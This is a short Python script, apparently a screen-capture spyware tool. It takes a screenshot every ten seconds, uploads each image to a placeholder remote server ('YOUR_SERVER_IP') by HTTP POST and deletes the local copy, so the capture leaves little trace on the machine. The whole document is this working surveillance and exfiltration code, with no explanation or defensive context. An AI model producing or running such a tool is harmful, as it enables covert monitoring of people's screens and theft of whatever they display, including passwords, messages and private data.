import pyautogui
import time
import requests
import os

SERVER_URL = "http://YOUR_SERVER_IP/upload"  # Change this to your server

def capture_and_upload():
    while True:
        try:
            # Take screenshot
            screenshot = pyautogui.screenshot()
            filename = f"screenshot_{int(time.time())}.png"
            screenshot.save(filename)

            # Upload
            with open(filename, 'rb') as img:
                files = {'file': (filename, img, 'image/png')}
                response = requests.post(SERVER_URL, files=files)

            print(f"[+] Uploaded: {filename} | Status: {response.status_code}")
            os.remove(filename)

        except Exception as e:
            print(f"[!] Error: {e}")

        time.sleep(10)  # 10-second delay

if __name__ == "__main__":
    capture_and_upload()
